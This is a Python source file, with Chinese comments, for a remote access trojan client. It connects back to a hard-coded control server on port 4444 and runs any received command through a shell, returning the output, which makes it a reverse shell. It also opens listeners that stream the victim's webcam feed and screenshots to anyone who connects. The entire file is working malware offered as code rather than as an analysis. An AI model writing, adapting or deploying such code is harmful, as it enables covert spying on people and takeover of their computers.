import socket
import subprocess
import time

import cv2
import os
import struct
import pickle
import threading

import pyautogui


def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

def open_video():
    # 打开摄像头
    capture = cv2.VideoCapture(0)

    if not capture.isOpened():
        print("Cannot open camera")
        return

    # 创建一个 socket 对象
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8485))  # 0.0.0.0 表示任何可用的网络接口
    server_socket.listen(1)
    print("摄像头开启-----Waiting for connection...")

    # 等待客户端连接
    client_socket, addr = server_socket.accept()
    print(f"Connected by {addr}")

    try:
        while True:
            # 从摄像头读取一帧图像
            ret, frame = capture.read()
            if not ret:
                print("Failed to capture image")
                break

            # 将图像数据序列化
            data = pickle.dumps(frame)
            # 发送数据大小
            client_socket.sendall(struct.pack("L", len(data)))
            # 发送图像数据
            client_socket.sendall(data)

    except :
        print("Program interrupted by user")
        capture.release()
        client_socket.close()
        server_socket.close()
        cv2.destroyAllWindows()
        exit()
    # 释放资源
    capture.release()
    client_socket.close()
    server_socket.close()
    cv2.destroyAllWindows()
# 处理客户端请求
def handle_client(client_socket):
    while True:
        try:
            # 捕获屏幕图像
            screen_data = pyautogui.screenshot()
            # 序列化图像数据
            data = pickle.dumps(screen_data)
            # 发送数据大小
            client_socket.sendall(struct.pack("L", len(data)))
            # 发送数据
            client_socket.sendall(data)
            # 等待一段时间，避免过度捕获
            time.sleep(1)  # 调整这个值以控制捕获频率
        except Exception as e:
            print(f"客户端断开连接: {e}")
            break
    client_socket.close()

def screen_caputre():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 8486))
    server_socket.listen(5)
    print("[*] 正在监听 0.0.0.0:8486")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[*] 连接来自 {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()
def receive_commands(s):
    while True:
        command = s.recv(1024).decode('gbk')
        if command == 'video':
            # 启动视频功能作为独立线程
            video_thread = threading.Thread(target=open_video)
            video_thread.start()
            continue
        if command == 'screen':
            # 启动视频功能作为独立线程
            video_thread = threading.Thread(target=screen_caputre)
            video_thread.start()
            continue
        if command.lower() == 'exit':
            s.close()
            break

        elif command[:2] == 'cd':
            os.chdir(command[3:])
            s.send(b'Changed directory')

        else:
            result = subprocess.run(command, shell=True, capture_output=True)
            s.send(result.stdout + result.stderr)

if __name__ == '__main__':
    ip = '192.168.20.104'  # 控制服务器的IP地址
    port = 4444        # 控制服务器的端口
    s = connect(ip, port)
    receive_commands(s)
